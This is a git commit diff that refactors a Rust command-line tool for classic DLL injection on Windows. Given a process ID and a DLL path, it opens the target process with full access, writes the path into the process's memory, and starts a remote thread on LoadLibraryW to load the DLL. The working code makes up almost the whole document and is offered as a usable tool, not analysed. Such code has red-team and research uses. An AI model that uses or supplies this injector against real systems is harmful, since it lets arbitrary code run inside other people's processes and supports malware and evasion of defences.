2f27de413fd56d87601ab68c7beba0601eca92f4
João <joaovictorti08@gmail.com>
2024-02-03 22:56:52 -0300

    refactor: update code

--- Process_Injection_DLL/src/main.rs
+++ Process_Injection_DLL/src/main.rs
@@ -1,45 +1,41 @@
-use std::{
-    mem::{size_of, transmute},
-    process::exit,
-    ptr::{null, null_mut},
+use std::mem::{size_of, transmute};
+use windows::{
+    core::{s, w},
+    Win32::{
+        Foundation::CloseHandle,
+        System::{
+            Diagnostics::Debug::WriteProcessMemory,
+            LibraryLoader::{GetModuleHandleW, GetProcAddress},
+            Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
+            Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS},
+        },
+    },
 };
-
-use windows::core::{s, w};
-use windows::Win32::Foundation::CloseHandle;
-use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
-use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
-use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
-use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS};
 
 fn main() {
     unsafe {
         let args: Vec<String> = std::env::args().collect();
         if args.len() != 3 {
             println!(".\\Dllinjection_rs.exe <pid> <path>");
-            exit(0);
+            return;
         }
 
         let pid = args[1].parse::<u32>().unwrap_or_else(|_e| {
-            println!("[!] PID error format");
-            exit(0)
+            panic!("[!] PID error format");
         });
 
         let path = &args[2];
         let dll: Vec<u16> = path.encode_utf16().collect();
 
-        let proc_address = GetProcAddress(
-            GetModuleHandleW(w!("Kernel32")).unwrap(),
-            s!("LoadLibraryW"),
-        );
+        let proc_address = GetProcAddress(GetModuleHandleW(w!("Kernel32")).unwrap(), s!("LoadLibraryW"));
 
         let hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, pid).unwrap_or_else(|e| {
-            println!("[!] OpenProcess Failed With Error: {e}");
-            exit(-1);
+            panic!("[!] OpenProcess Failed With Error: {e}");
         });
 
         let address = VirtualAllocEx(
             hprocess,
-            Some(null_mut()),
+            None,
             dll.len() * size_of::<u16>(),
             MEM_RESERVE | MEM_COMMIT,
             PAGE_READWRITE,
@@ -51,26 +47,20 @@ fn main() {
             dll.as_ptr() as _,
             dll.len() * size_of::<u16>(),
             None,
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] WriteProcessMemory Failed With Error: {e}");
-            CloseHandle(hprocess);
-            exit(-1);
+        ).unwrap_or_else(|e| {
+            panic!("[!] WriteProcessMemory Failed With Error: {e}");
         });
 
         let hthread = CreateRemoteThread(
             hprocess,
-            Some(null()),
+            None,
             0,
             Some(transmute(proc_address)),
             Some(address),
             0,
-            Some(null_mut()),
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] CreateRemoteThread Failed With Error: {e}");
-            CloseHandle(hprocess);
-            exit(-1);
+            None,
+        ).unwrap_or_else(|e| {
+            panic!("[!] CreateRemoteThread Failed With Error: {e}");
         });
 
         CloseHandle(hprocess);
